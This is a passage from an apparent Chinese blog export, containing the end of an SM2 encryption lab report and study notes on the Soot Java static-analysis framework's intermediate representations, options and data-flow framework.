(hex(C1[0])[2:], hex(C1[1])[2:]))        t = self._KDF(binascii.hexlify(bytestring), klen)        iM = C2 ^ int(t, 16)        u = sm3.sm3_hash([            i for i in bytes.fromhex(&#x27;%s%s%s&#x27; % (hex(C1[0])[2:], hex(iM)[2:], hex(C1[1])[2:]))        ])        if binascii.hexlify(C3).decode() == u:            return binascii.a2b_hex(hex(iM)[2:]).decode()        else:            print(&quot;[+] Something Error during decrypting...&quot;)            exit(-1)\n数据分析输入数据1: \nOne is always on a strange road, watching strange scenery and listening to strange music. Then one day, you will find that the things you try hard to forget are already gone.\n运行结果如下:\n首先可以看到一系列初始化操作以及输入的明文，由随机数生成器产生的随机数。\n这里针对加密明文的表现形式选择了非压缩模式，密文结果由16进制表示。\n当解密时会有验证Hash的操作，当Hash验证成功且解密的密文与输入明文数据相同时，会输出“[+] You have successfully decrypted”，由此可以看到加密解密成功\n \n输入数据2：\nMost of us compare ourselves with anyone we think is happier — a relative, someone we know a lot, or someone we hardly know. As a result, what we do remember is anything that makes others happy, anything that makes ourselves unhappy, totally forgetting that there is something happy in our own life.\n运行结果：\n \n输入数据3：\nHappiness is not about being immortal nor having food or rights in one’s hand. It’s about having each tiny wish come true, or having something to eat when you are hungry or having someone’s love when you need love.\n运行结果：\n \n思考与总结\n实验过程中遇到了什么问题，如何解决的？\n\n其实刚开始就遇到了很多问题，像加法和倍点运算出现错误，刚开始我直接使用的除法运算，会碰到除0错误。倍点运算一开始直接采用循环相加的实现，导致运算时间过长，后来仔细看了一遍文档针对不同实现算法的说明后，重新构建思路，解决了此类运算问题。其次一个问题就是对于数据类型转换的问题，文档上提供的说明有的只是一系列公式比较抽象，结合对于Python相关函数的查询，我了解到了binascii库以及bin、hex、int、bytes等相关函数的使用场景，相结合之后实现了转换的问题。\n\n通过该实验有何收获和感想？\n\n这是最后一次密码学实验了，感觉收获相比于之前几次都很大。首先是课堂上老师讲的给出了一个整体的轮廓，但是具体的实现细节都需要自己去结合官方文档以及查阅资料来去了解明白。无论是从编程能力，还是对密码学分组密码的理解上都有了很大的提升。\n","tags":["cryptography"]},{"title":"Soot文档学习（1）","url":"/2023/01/17/Soot%E5%AD%A6%E4%B9%A0/","content":"写在前面有了静态分析基础，开始看看这个Soot，一定得实践与理论结合着来，把文档看一遍\nA Survivor’s Guide to Java Program Analysis with Soot1 IntroductionSoot研发出来的目的是为了提供一种更好、更快的理解Java程序执行的工具。\nSoot主要的优势之一在于它提供了四种不同的中间表示（IR）用作分析。每一种IR都是不同水平的抽象，使得分析时带来不同方面的便利。分别是 Baf, Grimp, Jimple和Shimple\nSoot构建了如下几种数据结构表示：\n\nScene\n该类表示程序分析时涉及到的完整环境。通过它，你可以设置例如，应用类（提供给Soot用于分析的类）、主类（包含 main 方法的类）和关于过程间分析的访问信息（例如，指向信息和调用图）\n\nSootClass \n代表一个装入到Soot当中或者使用Soot创建的类\n\nSootMethod\n代表一个类中的方法\n\nSootField\n代表方法中的成员属性\n\nBody\n代表方法体。根据不同的IR表示，有不同的方法体格式\n\n\n1.1 安装Soot这里需要注意在下载soot时分为两种类型，soot-&lt;RELEASE&gt;-jar-with-dependencies.jar是包含了所有所需库的文件；而soot-&lt;RELEASE&gt;.jar仅仅包含Soot本身，需要手动选择需要分析的依赖。\n1.2 Road-map to this guide(路线图)\n内部表示 详细描述Soot中的四种中间表示\n基本的Soot框架 简述了构成方法体的基础对象\nSoot作为独立的工具 描述了如何使用Soot作为独立的工具。为此，本节介绍了Soot的内部工作原理、在命令行使用Soot及其接收的不同参数、Soot提供的一些内置分析框架以及如何使用用户自定义分析框架来扩展该工具\n\n数据流框架 细致地描述了如何利用Soot内置数据流框架，伴随一个复杂表示分析的完整实例实现。这部分还讲述了标记Eclipse插件的代码以可视化地显示结果\n\n调用图构建 介绍如何在整个程序分析期间获取调用图，并使用它提取各种信息\n\n指针分析 介绍了两种高级指针分析框架 SPARK and Paddle\n\n抽象控制流图的提取 描述了如何使用Soot来提取抽象控制流图的定制IR，以用作分析的起点，该分析可能受益于在抽象过程中所做的简化，如Java字符串分析\n\n2 Basic Soot Constructs在这一节我们描述贯穿在Soot使用当中的常用基础对象。具体来讲，我们关注那些组成方法中代码的对象。由于这些都是非常简单的构造，因此这些描述相当简短\n2.1 Method bodiesSoot类Body代表一个方法体，它表示代码的风格取决于使用的IR，分别有：\n\nBafBody\nGrimpBody\nShimpleBody\nJimpleBody\n\n我们可以使用Body来访问各种信息，特别是我们可以检索局部声明（getLocals()）的 Collection 类变量（Soot使用它自己的Collection实现，称为 Chain），构成方法体中的语句（getUnits()）和方法体中的异常处理（getTraps()）\n2.2 StatementsSoot中的语句由接口Unit来表示，其中对于不同的IR存在不同的实现方式-例如，Jimple使用Stmt，而Grimp使用Inst\n通过Unit类，我们可以获取到所有变量值（getUseBoxes()）, 值定义的地方getDefBoxes()以及两者都取getUseAndDefBoxes(). 另外，我们可以获取跳转到当前unit的所有unit（getBoxedPointingToThis()）以及当前unit要跳转到的所有unit（getUnitBoxs()）. 这里的跳转指的是控制流而非顺序执行。Unit类也提供不同的方法来查询分支行为，如fallsThrough() 和 branches(). \n\n对于 getDefBoxes() 的解释\n返回一个 valueBox 的列表，对应 unit（语句）中所有已被定义的变量\n\nfallsThrough()\n如果执行可以顺利流到紧挨着的下一条语句，就会返回True\n\nbranches()\n如果执行可以继续流下去，但是并不会流到紧挨着的下一条语句，返回True\n\nredirectJumpsToThisTo()\n改变所有曾经指向这个Unit的跳转，让他们都指向这个新的newLocation\n\n\nValuesValue表示一个数据。Value的表示可以是局部变量（Local），常量（Jimple Constant），表达式（Jimple Expr）等等.  Expr 表达式又拥有不同的实现，比如BinopExpr 和 InvokeExpr，通常可视为对一个或多个值执行某些操作并返回另一个值\n其中一些常用的类型：\n\nLocal \n\n\nConstant \nStringConstant 和 NumericConstant\n\n\nstmt 与 Expr 的区别：\n前者无返回值，后者有返回值\n实现 stmt 接口：AbstractStmt\nAbstractStmt 子类说明：\n\nAbstractDefinitionStmt\n子类 1：JAssignStmt\n复制语句\n子类2：JIdentityStmt\n显式或隐式赋值给变量\n\n函数传参\nr1 := @parameter0: java.lang.String\n\nthis 传参\nr0 := @this: com.spring.Controller\n\n\n两者区别：\n\n\nAbstractSwitchStmt\nswitch语句主要由于JVM对于不同的Switch语句，会生成不同的操作指令\n子类1：JLookupSwitchStmt\n子类2：JTableSwitchStmt\n\nAbstractOpStmt\n\n\n\n表达式 Expr 部分\n\nAbstractInvokeExpr\n调用的表达式\n具体类型如下：\n| 类型                | soot                     | 具体用途                                                     || :————————— | :———————————- | :—————————————————————————————- || invokestatic    | JStaticInvokeExpr    | 调用static静态方法                                           || invokevirtual   | JVirtualInvokeExpr   | 调用虚方法、final方法                                        || invokeinterface | JInterfaceInvokeExpr | 调用接口方法，在运行时搜索实现了这个方法的对象，进行合适的调用 || invokespecial   | JSpecialInvokeExpr   | 调用实例方法，init构造方法、private、父类方法                || invokedynamic   | JDynamicInvokeExpr   | 动态解析出需要调用的方法，然后执行 invoke lambda             |\n\nAbstractBinopExpr\n数学运算操作\n\n\nReferences当Unit包含另一个Unit的时候，需要通过Box来访问\n引用在Soot中被称作 boxes，其中有两种不同的类型：\n\nUnitBoxes 针对Units类，当一个unit类存在多个后继时使用，比如分支语句的情况\nValueBoxes 针对Values类，如前所述,每个unit都有一个value使用和定义的标识，当替换成use或者def boxes在units中将会很有用，比如在执行常量传播时\n\n3 Intermediate RepresentationsSoot框架为代码提供了四种中间表示形式：Baf, Jimple, Shimple和Grimp. 这些表示针对不同的用途为代码提供了不同的抽象级别. 比如，baf是一种字节码标识，类似Java字节码；而Jimple是一个无堆栈的、类型化的3地址代码，适用于大多数分析。这节详细描述一下Jimple表示，简述一下其他几种\n3.1 BafBaf是一种基于堆栈的线性字节码表示。用于将Java字节码作为堆栈代码进行检查，但将常量池抽象出来，并将指令的类型相关变体抽象为单个指令（例如，在Java字节码中，有许多用于添加整数、长整数等的指令，在Baf中，它们都被抽象为单个加法指令）。Baf中的指令对应Soot的Units类，因此所有指令的实现都实现了Inst接口，后者又实现了Unit和Switchable接口。\nBaf表示的实现存放在soot.baf和soot.baf.internal包中。\nBaf对于基于字节码的分析、优化和转换（如peephole）非常有用\n作为基于Baf表示的Soot框架的一部分提供的优化可以在soot.baf.toolkits.base包中找到\n3.2 JimpleJimple是Soot中的主要表示。其是类型化的、3地址码的、基于语句的中间表示。\nJimple表示可以直接由Soot创建，或者基于Java源代码、字节码或者class文件创建。\n从字节码到Jimple的转换通过从字节码到无类型Jimple的naive转换，具体通过为隐式堆栈位置引入新的局部变量并使用子例程移除JSR指令。从无类型的Jimple当中推断出局部变量的类型并添加进来。其还会清除Jimple代码中的冗余代码，如未使用的变量或赋值。转换到Jimple的一个重要步骤是表达式的线性化（和命名），使得一个语句最多只能引用3个局部变量或常数。从而为执行优化提供了更规则、更方便的表示。在Jimple表示下，分析只需要处理15种语句，而Java字节码中可能有200多种指令。\n在Jimple中，语句对应Soot中的Units类并且可以如此使用。其拥有15种语句，核心的有：NopStmt, IdentityStmt  和 AssignStmt。过程内控制流语句有IfStmt, GotoStmt, TableSwitchStmt(对应JVM的tableswitch指令) 和 LookupSwitchStmt(对应JVM的lookupswitch指令). 过程间分析语句有InvokeStmt, ReturnStmt,ReturnVoidStmt. 监控语句有EnterMonitorStmt 和 ExitMonitorStmt，最后两个是ThrowStmt 和 RetStmt(从JSR中返回，如果是从字节码中生成Jimple语句则不创建)\n将下面的例子生成Jimple语句\npublic class Foo &#123;    public static void main(String[] args) &#123;        Foo f = new Foo();        int a = 7;        int b = 14;        int x = (f.bar(21) + a) * b;    &#125;    public int bar(int n) &#123;        return n + 42;    &#125;&#125;\n执行下列命令用于生成Jimple文件\njava -cp .\\soot-4.4.0-20220321.130129-1-jar-with-dependencies.jar soot.Main -pp -f J -cp .  Foo\nJimple文件如下\npublic static void main(java.lang.String[])  &#123;      Foo f, temp$0;      java.lang.String[] args;      int a, b, x, temp$1, temp$2, temp$3, temp$4;args := @parameter0: java.lang.String[];temp$0 = new Foo;specialinvoke temp$0.&lt;Foo: void &lt;init&gt;()&gt;();f = temp$0;a = 7;b = 14;// InvokeStmt      temp$1 = virtualinvoke f.&lt;Foo: int bar(int)&gt;(21);temp$2 = temp$1;temp$3 = temp$2 + a;temp$4 = temp$3 * b;x = temp$4;return;  &#125;  public int bar(int)  &#123;      Foo this;      int n, temp$0, temp$1;this := @this: Foo;n := @parameter0: int;temp$0 = n;temp$1 = temp$0 + 42;return temp$1;  &#125;\n上述代码片段为main和bar方法生成的Jimple语句。Jimple是Java源代码和Java字节码的混合体。Jimple中拥有类似Java的语句结构那样的局部变量的声明和赋值，但是对于控制流和方法调用，风格又和Java字节码类似。以`开头的局部变量表示堆栈位置，而不是原始程序中的局部变量，而不带`的变量表示真实的局部变量。\n线性化过程将语句int x = (f.bar(21) + a) * b分解成三地址码的形式temp$3 = temp$2 + a;\n        temp$4 = temp$3 * b;\n在Jimple中，参数值和this引用使用IdentityStmt进行赋值，例如bar方法中的语句n := @parameter0: int;以及this := @this: Foo; 。通过使用IdentityStmt，确保所有局部变量至少有一个定义点，因此this变量在哪里被定义就很清晰了。\n所有局部变量都是类型化的。在分析过程中使用类型信息很有帮助\n请注意，Jimple不是Java源代码，特别是当您将Java源代码与生成的Jimple代码进行比较时，引入新的唯一变量可能会导致结果与预期之间的巨大差异\nJimple中间表示在以下依赖中提供soot.jimple和soot.jimple.internal，在soot.jimple.toolkits.*特别是 soot.jimple.toolkits.scalar和soot.jimple.-\ntoolkits.annotation.*中有很多优化的集合类可以使用\n3.3 ShimpleShimple中间表示是Jimple表示的静态单赋值形式，SSA-form保证每个局部变量都有一个静态定义点，这大大简化了许多分析。\n除了单静态定义点和所谓的phi-nodes比较特殊，其他形式均与Jimple一样，因此两者几乎可以同等对待\n下面实例类\npublic class ShimpleExample &#123;    public int test() &#123;        int x = 100;        while (as_long_as_it_takes) &#123;            if (x &lt; 200) &#123;                x = 100;            &#125; else &#123;                x = 200;            &#125;        &#125;        return x;    &#125;&#125;\n利用下面的指令生成Shimple文件\njava -cp .\\soot-4.4.0-20220321.130129-1-jar-with-dependencies.jar soot.Main -pp -f S -cp . ShimpleExample\n(我自己生成的更复杂，先看paper上的样例)\npublic int test() &#123;\tShimpleExample r0;\tint i0, i0_1, i0_2, i0_3;\tboolean $z0;\t\tr0 := @this: ShimpleExample;(0) i0 = 100;label0:\ti0_1 = Phi(i0 #0, i0_2 #1, i0_3 #2);\t$z0 = r0.&lt;ShimpleExample: boolean as_long_as_it_takes&gt;;\tif $z0 == 0 goto label2;\tif i0_1 &gt;= 200 goto label1;\ti0_2 = 100;(1) goto label0;label1:\ti0_3 = 200;(2) goto label0;\tlabel2:\t\treturn i0_1;&#125;\n相比于Jimple结构，这里有两点不同。新引入的Phi-node以及i0变量被拆分成了4个变量i0,i0_1,i0_2,i0_3\n在SSA形式下，i0_1的值依赖于控制流图中涉及的路径，其与Phi-nodes相关。该值可能来自（0）、（1）或（2）。Phi-node可以被看作是一个函数，如果流从（0）到达则返回i0的值，如果流从（1）到达则返回i0_2的值，或者如果流从（2）到达则返回i0_3的值。\nSimple对控制流进行了显式编码，因此可以方便地对Simple代码进行控制流敏感分析\n实际上，在上面的示例中x是常量，因此test方法可以是常量传播并合并到单个return语句中，大多数控制结构都是不必要的\n为了说明Shimple和Jimple表示之间的差异，我们基于每种表示优化程序并比较结果\nSoot提供这样一种优化参数 -O\n\n在这里将会运行常量传播并作合并处理\njava -cp .\\soot-4.4.0-20220321.130129-1-jar-with-dependencies.jar soot.Main -pp -f J -O -cp . ShimpleExample\n基于Jimple处理的结果如下\npublic int test() &#123;\tShimpleExample r0;\tint i0;\tboolean $z0;\tr0 := @this: ShimpleExample;\ti0 = 100;label0:\t$z0 = r0.&lt;ShimpleExample: boolean as_long_as_it_takes&gt;;\tif $z0 == 0 goto label2;\tif i0 &gt;= 200 goto label1;\ti0 = 100;\tgoto label0;label1:\ti0 = 200;\tgoto label0;\tlabel2:\t\treturn i0;&#125;\n这与我们之前看到的输出完全相同，即运行未经优化的Soot时的输出！基于Jimple表示，优化不能推导出x是常数\n利用Shimple进行分析\njava -cp .\\soot-4.4.0-20220321.130129-1-jar-with-dependencies.jar soot.Main -pp -f J -O -via-shimple -cp . ShimpleExample\n基于Shimple的结果如下\npublic int test() &#123;\tShimpleExample r0;\tboolean $z0;\tr0 := @this: ShimpleExample;label0:\t$z0 = r0.&lt;ShimpleExample: boolean as_long_as_it_takes&gt;;\tif $z0 == 0 goto label1;\tgoto label0;label1:\treturn 100;&#125;\n\n这与预期一致。因为成员变量as_long_as_it_takes非静态的，因此还是得保留while循环，但是优化器推断出了x是个常量，因此phi-node在三个相同的值之间作了选择并且优化掉了。\n结论：Shimple显式地暴露了控制结构，并且变量只有静态的单个赋值\nShimple中间表示可在依赖 soot.shimple / soot.shimple.internal，并且soot.shimple.\ntoolkits.scalar可以获得constant-folder（常量合并这个功能？）\n3.4 GrimpGrimp类似于Jimple，但允许表达式树与New操作符一起使用。在这方面，Grimp比Jimple更接近于Java源代码，因此更容易阅读，因此是人类读者检查反汇编代码的最佳中间表示\n下面用指令运行一下Foo类的例子生成Grimp中间表示\njava -cp .\\soot-4.4.0-20220321.130129-1-jar-with-dependencies.jar soot.Main -pp -f G -cp . Fooxxxxxxxxxx c java -cp .\\soot-4.4.0-20220321.130129-1-jar-with-dependencies.jar soot.Main -pp -f G -cp . Foo\n结果如下：\n\n\n这两个main方法之间(Jimple 和 Grimple生成的)有三个非常明显的区别\n\n表达式树未线性化\n对象实例化和构造函数调用合并为new操作符\n由于表达式树不是线性化的，所以不会创建新的临时局部变量（以$开头的局部变量），但是我们确实需要新的临时局部变量例如在while中\n\nGrimple表示适用于某些类型的分析，如available expressions（如果既需要复杂表达式，也需要简单表达式）。Grimp也是一个很好的反编译起点\nGrimple中间表示位于依赖soot.grimp / soot.grimp.internal，一些优化可以在soot.grimp.toolkits.base中得到\n4 Soot as a stand-alone tool完整内容可在 https://github.com/soot-oss/soot/wiki/Tutorials\nSoot可以作为一个独立的工具用于许多不同的目的，例如对代码做一些内置分析或转化。本节将介绍如何将Soot用作独立工具、如何根据其用途对选项进行分组，并详细介绍一些最常用的选项\n如果类路径中包含Soot，则可以按如下所示从命令行调用Soot\njava [javaOptions] soot.Main [sootOptions] classname\n其中[sootOptions]表示Soot接受的各种选项，classname表示待分析的类\n获取Soot支持的选项列表：\njava soot.Main -hjava -jar  .\\soot-4.4.0-20220321.130129-1-jar-with-dependencies.jar --help\n类划分：在Soot中，我们区分三种类：参数类、应用程序类和库类\n参数类是指定给Soot的类。使用命令行工具时，这些类是显式列出的类（直接给出的），也可以是在-process-dir选项指定的目录下的类\n应用程序类是要由Soot分析或转换并转换为输出的类\n库类相当于应用程序中所要依赖的类，会被用于分析和转换但本身不会转换输出\n还有两种模式会影响类的分类方式：应用模式和非应用模式\n在应用程序模式下，参数类引用的所有类除了JRK中的一些类之外本身也都是应用程序类。在非应用程序模式下，这些类将是库类\nSoot提供了更多选项来偏向哪些类是应用程序模式下的应用程序类\n-i PKG -include PKG \t\t包中名称以PKG开始的类将被视为应用程序类-x PKG, -exclude PKG \t\t包中名称以PKG开始的那些类将被视为库类-include-all \t\t\t参数类引用的所有类都将被视为应用程序类Soot提供几个选项来控制输入处理Input options -cp PATH, -soot-class-path PATH \t将PATH设置为搜索类的类路径-process-dir DIR \t将DIR下的所有类设置为参数类-src-prec FORMAT  设置要使用的源文件的优先级，格式如：c（或class）表示类文件（默认值）; J（或jimple）\t\t\t\t\t 表示Jimple文件; java则表示java文件Output options -f J -f jimple      指定输出格式 （应用程序类默认输出格式为class文件）-d DIR, -output-dir DIR \t指定用于存储输出文件的文件夹DIR（默认为sootOutput）-outjar, -output-jar\t\t将所有输出保存在JAR文件中，而不是目录中\n4.1 Soot phasesSoot的执行分为几个阶段，称为 packs。第一步是生成Jimple代码，然后分配到不同包中，这是通过解析类、jimple或java文件，然后将其结果传递给 jimpleBody（jb）包来完成的。\n包的命名格式很简单，第一个字母表示包接受哪个IR表示，比如s代表Shimple，j代表Jimple，b代表Baf，以及g代表Grimp。第二个字母指定包的职责，B用于方法体创建，t用于用户定义的转换，o用于优化，a用于属性生成（注释），包名结尾的p代表“包” 。\n允许用户定义转换的包如jtp（Jimple转换包）和stp（Shimple转环包）比较特殊。任何用户定义的转换（例如，来自分析的标记信息）都可以注入到这些包中，然后它们将包含在Soot的执行中\n包的执行流图如下所示：（程序内分析）\n\n每个应用程序类都通过此执行流中的路径进行处理，但它们无权访问处理其他应用程序类时生成的任何信息\n注意这里的 t 类似插件的作用，可以在其中执行自定义的转换\nPackManager.v().getPack(&quot;jtp&quot;).add(new Transform(&quot;jtp.myTransform&quot;, new BodyTransformer()&#123; \t@Override\tprotected void internalTransform(Body b, String phaseName,\t\t\tMap options) &#123;\t\t\t// TODO Auto-generated method stub\t\t\t...\t\t\t\t&#125;&#125;\n程序间分析：对于过程间分析，执行流稍有不同。我们需要通过指定选项 -w 将Soot设置为Whole-program模式。在此模式下，Soot在执行周期中将包含三个其他程序包：cg（调用图生成）、wjtp（完整Jimple转换包）和wjap（完成Jimple注释包）。此外，为了添加整个程序优化（例如静态内联）功能，我们指定选项 -W 进一步向包中添加 wjop（完整Jimple优化包)。这些包与程序内分析使用的包之间的区别在于，这些包中生成的信息可通过Scene 供Soot的其余部分使用\n\nPhase options:\n要生成Soot中所有可用包的列表，请执行以下命令\njava soot.Main -pl\n此信息可用于获取有关不同包及其包含的操作（例如，内置分析）可用选项\n要列出包的帮助信息和可用选项，可用\njava soot.Main -ph PACK\n要为包设置选项，需要指定-p选项，后接包名和OPT:VAL形式的键值对。OPT是想设置的选项，VAL是对应的值。\n4.2 Off-The-Shelf AnalysisSoot包括几个示例分析来演示其功能\nNull Pointer Analysis：内置的空指针分析位于jap包中，并进一步分为两个单独的实体：空指针检查器和空指针着色器。前者查找有可能抛出NullPointerException的指令，而后者使用该信息为Eclipse插件添加标记信息，要运行空指针着色器以在程序中生成空值的可视化效果，可以：\njava soot.Main -xml-attributes -f J -p jap.npcolorer on MyClass\n这将产生一个Jimple文件，当在Eclipse中查看此文件时，引用类型将根据其是否为null进行颜色编码（绿色表示肯定不为空，蓝色表示未知，红色表示肯定为空）\nArray Bounds Analysis：内置分析的另一个很好的例子是数组边界检查器，分析器会去检查数组是否越界。这种分析可以使编译器通过不在字节码中插入显式数组边界检查来达到优化效果。此分析也位于jap.abc下的jap包中。运行它以生成可视化效果的最简单方法是\njava soot.Main -xml-attributes -f J -p jap.abc on -p jap.abcadd-color-tags:true MyClass\n分析结果说明了对于上界和下界，是否存在不安全的访问\nLiveness Analysis：内置的活动性分析会对语句中确定存在的变量进行着色。它只有一个选项，即是否启用\njava soot.Main -xml-attributes -f J -p jap.lvtagger on MyClass\n结果指出了语句中的所有活跃变量\n4.3 Extending Soot’s Main class设计和实现一个分析后，我们还希望能够从Soot中配合其他特征（比如内置分析）来使用。为此，我们需要扩展Soot的Main类以包含我们自己的分析。请注意，这不是Java意义上的扩展，而是一个中间步骤的注入，在这个步骤中，我们的分析被放入Soot。换句话说，我们希望Soot运行我们的分析，并且仍然处理我们传递给它的所有其他选项。\n如何完成取决于注入的分析是否为程序间分析或程序内分析。前者需要注入到wjtp阶段，而后者进入jtp阶段。下面的代码示例演示如何将类MyAnalysisTagger（执行某些过程内分析）的实例注入到Soot中。\n\n5 The Data-Flow Framework一般来说，我们可以将流分析设计为四个步骤：\n\n确定分析的性质。它是一个前向还是后向分析？我们是否需要特别考虑分支？\n确定预期的approximation。这是一个may还是一个must的分析？实际上，这个在决定合并流经节点的信息时是并集还是交集\n执行实际流，本质上是为中间表示中的每种语句编写等式，比如如何处理赋值语句\n确定入口节点（如果是反向流，则为出口节点）和内部节点的初始状态或近似值，通常是空集empty或全集top，取决于分析的保守程度\n\n执行数据流分析时，我们需要某种结构来表示数据如何在程序中流动，例如控制流图（cfg）。Soot数据流框架旨在处理任何形式的cfg实现接口soot.toolkits.graph.DirectedGraph\n5.1 Step 1: Nature of the analysisSoot提供了三种不同的分析实现：ForwardFlowAnalysis, BackwardFlowAnalysis 和ForwardBranchedFlowAnalysis。前两个图除了流向不同外都是相同的，其结果是两个maps：节点到IN集合以及节点到OUT集合。最后一个分析实现提供通过分支节点的每个分支传播不同信息的能力，比如：从包含语句if(x&gt;0)的结点流出的信息，可以是x&gt;0到一个分支或者$x\\leq 0$到另一个分支。因此，该分析的结果是三个maps：节点到IN集合、节点到满足fallthrough 的OUT集合以及节点到分支OUT集合。所有这些的实现基于了不动点原理的worklist算法。如果您想以其他方式实现它，可以扩展其中一个抽象超类：AbstractFlowAnalysis (the top one), FlowAnalysis或BranchedFlowAnalysis，否则，将特定分析插入框架的方法是扩展前三个类中的一个\n对于上述非常复杂的表达式的例子，我们需要使用反向分析，因此我们的类签名将是：\nclass VeryBusyExpressionAnalysis extends BackwardFlowAnalysis\n现在，为了利用框架的功能，我们需要提供一个构造函数。在这个构造函数中，我们需要做两件事：\n\n调用父类构造函数\n调用不动点机制实现分析\n\n\n5.2 Step 2: Approximation level分析的approximation程度取决于分析如何执行lattice元素的JOINs操作。通常分析要么是may analysis，要么是must analysis.。在may分析中，我们使用union连接元素，而在must分析中，我们使用intersection连接元素。在流分析框架中，连接是在merge方法中执行的。在非常复杂的表达式分析例子是must analysis，因此我们使用交集来连接：\n\n从这里可以看出，流分析框架被设计成具有这样的抽象，即它不关心如何表示格。这个例子中我们使用了FlowSet类。由于这种抽象，我们还需要提供一种将一个lattice的内容复制到另一个lattice的方法\n\n5.3 Step 3: Performing flow这是分析的真实工作发生的地方，信息通过cfg中的节点流动。所涉及的框架方法是flowThrough，我们可以将此过程视为包含两个部分：\n\n我们需要将信息从IN集合复制到OUT集合，同时排除掉节点删除的信息\n\n我们需要向节点生成的OUT集合添加信息\n\n\n\n在表达式复杂的例子中，节点将删除那些引用的已经被定义过的表达式\n\nkill和gen方法不是框架的一部分，而是用户定义的方法。\n5.4 Step 4: Initial state这一步包括决定入口点的lattice元素和其他lattice元素的初始内容，在流分析框架中，这是通过重写两个方法来实现的：entryInitialFlow 和newInitialFlow。对于复杂表达式分析的例子，入口点是最后一条语句（出口点），我们用空集初始化。至于其他格点，我们也用空集初始化。\n\n这里注意ValueArraySparseSet的构造是我们自己对于ArraySparseSet类的特殊化实现。\n5.5 Limitations对于像复杂表达式分析这样的例子，我们需要记住实际分析的是什么。在我们的例子中，我们正在分析Jimple代码，作为一个三地址代码，复合表达式将被分解为中间部分（比如 a+b+c将变为temp = a+b以及temp + c）。这使我们认识到，我们的特定分析如果没有修改，只能分析原始源代码中可能表达式的一小部分。在这种特殊情况下，我们可以分析Grimp代码，并特别考虑复合表达式。\n5.6 Flow sets在 Soot中，flow sets (tai-e中叫 data-sets) 表示在控制流图中结点关联的数据（比如对于活跃表达式来说，结点的flow set就是一系列活跃的表达式）\nflow set有两种不同的概念，有界（BoundedFlowSet接口）和无界（FlowSet接口），有界set是一个知道其可能值的全域的集合，无界set相反\n实现FlowSet接口的类需要实现以下方法（以及其他方法）：\n\n这些操作足以使流集合成为有效的格元素。\n另外当实现BoundedFlowSet时，需要提供生成该集合的补集以及top集\nSoot提供了四种flow sets的四种实现：ArraySparseSet, ArrayPackedSet ,ToppedSet和DavaFlowSet。\nArraySparseSet 是一个无界flow set，集合表示为引用数组。请注意，在比较元素是否相等时，它使用从Object继承的方法equals。这里的问题是soot元素（表示某些代码结构）不会重写此方法，相反，它们实现了接口soot.EquivTo。因此，如果您需要一个包含例如二元运算表达式的流集，您应该使用equivTo方法来比较是否相等\nArrayPackedSet 是一个有界flow set，这里要求提供FlowUniverse对象，其只是某种集合或数组的包装，并且它应该包含可以放入集合中的所有可能值。集合由整数和对象之间的双向映射表示，以及指示全域的哪些元素包含在该集合内的位向量（如果设置了索引0处的位，则该集合包含整数0在映射中的元素）。这个实现同样也有ArraySparseSet关于元素相等的限制\nToppedSet：包装另一个流集合（有界或无界），添加关于它是否是格的top集合的信息\n在我们活跃表达式示例中，我们需要包含表达式的流集合，因此我们希望比较它们的等价性。a + B的两次不同出现将是实现BinopExpr接口的某个类的不同实例化，因此它们永远不会相等。为了解决这个问题，我们使用ArraySparseSet的修改版本，其中我们更改了contains方法的实现：\n\n5.7 Control flow graphsSoot在soot.toolkits.graph包中提供了几种不同的控制流图（CFG）。这些图的基础是接口 DirectedGraph。它定义了用于获取以下内容的方法：图的入口点和出口点、给定节点的后继节点和前驱节点、以某种未定义的顺序迭代图的迭代器以及图的大小（节点数）\n这里给出 API\n\n我们将在这里描述的实现是表示CFG的实现，其中节点是Soot单元。此外，我们将只描述表示过程内分析流\n这类图的基类是 UnitGraph，它是提供构建CFG工具的抽象类。它有三种不同的实现方式：BriefUnitGraph, ExceptionalUnitGraph 和 TrapUnitGraph.\nBriefUnitGraph 是非常简单的，因为它没有表示由于抛出异常而产生的控制流的边\nExceptionalUnitGraph 包含从throw子句到其处理程序（catch块，在Soot中称为Trap）的边，前提是 trap 是方法体中的局部变量。此外，此图还考虑了j计算语句可能隐式抛出的异常（例如ArrayIndexOutOfBoundsException）. 对于每个可能抛出隐式异常的单元，从每个单元的前导到相应陷阱处理程序的第一个单元之间都有一条边。此外，如果异常单元包含副作用，则还将从异常单元向陷阱处理程序添加边（这里指的异常单元中出现异常的情况吧）。如果它没有副作用，则可以利用传递给图构造器之一的参数来选择性地添加或不添加该边，这是执行控制流分析时通常使用的CFG。\nTrapUnitGraph 类似 ExceptionalUnitGraph，也需要考虑抛出的异常。这里有三个主要区别：\n\n从每个 trap 单元添加边（即，在try块内）到陷阱处理程序\n不存在可能向陷阱处理程序抛出隐式异常的单元的前趋项的边（除非它们也被陷阱捕获）\n单元中总是有可能会向陷阱处理程序抛出隐式异常的一条边\n\n要为给定的方法体构建CFG，只需将方法体传递给CFG构造函数之一\nUnitGraph g = new ExceptionalUnitGraph(body);\n5.8 Wrapping the results of the analysis特定分析的结果可通过 AbstractFlowAnalysis#getFlowBefore 方法，FlowAnalysis#getFlowAfter方法，BranchedFlowAnalysis#getBranchFlowAfter和getFallFlowAfter方法。这些方法都只是返回表示lattice元素的对象. 为了更加稳固，通过给分析提供一个接口，屏蔽掉结果？而返回一个以lattice作为元素的不可修改的列表。\n对于活跃表达式分析示例，我们选择遵循内置Soot分析中使用的约定—提供通用接口及其一种可能的实现。接口非常简单，只是提供相关数据的访问器\n\n这个接口的实现（我们将其命名为SimpleVeryBusyExpressions）执行实际的分析，并将数据收集到它自己的maps中，内含单元映射到不可修改的表达式列表\n下面实例如何手动运行活跃表达式分析：\n\n6 Annotating codeSoot中的注释框架最初设计用于支持使用Java类文件属性优化Java程序，其思想是将信息标记到代码的相关位上，然后虚拟机可以使用这些标记来执行某些优化，比如排除不必要的数组边界检查。这个框架(位于soot.tagkit)由四个主要的概念：Hosts, Tags, Attributes 和 TagAggregators\nHosts 是可以保存和管理标记的任何对象，在 Soot中 SootClass,SootField, SootMethod, Body, Unit, Value 和 ValueBox均实现了这个接口\nTags 是可以标记到hosts的任何对象，这是将名称-值对连接到hosts的一种非常通用的机制\nAttributes 是标记概念的扩展。任何属性都可以输出到类文件中，特别是任何对类、字段、方法或主体的标记都应该实现此接口。属性应该映射到类文件属性中，并且因为Soot使用一个名为Jasmin的工具来输出字节码，所以任何应该输出到类文件的内容都必须继承JasminAttribute,Soot中的一个此类实现是CodeAttribute\nTagAggregators 